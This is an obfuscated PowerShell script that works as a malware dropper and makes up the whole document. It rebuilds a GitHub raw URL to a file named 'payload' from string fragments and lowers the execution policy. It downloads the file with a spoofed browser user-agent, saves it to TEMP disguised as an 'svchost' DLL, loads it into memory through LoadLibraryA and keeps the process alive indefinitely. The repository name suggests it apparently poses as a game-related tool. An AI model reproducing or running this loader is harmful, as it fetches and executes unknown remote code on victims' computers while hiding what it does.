$ErrorActionPreference = @("St","op") -join ""
$_0x91A = @("https://raw",".githubusercontent",".com/mk121X","/valorant/refs","/heads/main/","payload") -join ""
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue

$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))

$_0xDLL = "$env:TEMP\svchost_$(Get-Random).dll"
$_0x7C1.DownloadFile($_0x91A, $_0xDLL)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NL {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibraryA(string lpFileName);
}
"@

$_0xH = [NL]::LoadLibraryA($_0xDLL)
if ($_0xH -eq [IntPtr]::Zero) { exit 1 }

while ($true) { Start-Sleep -Seconds 60 }
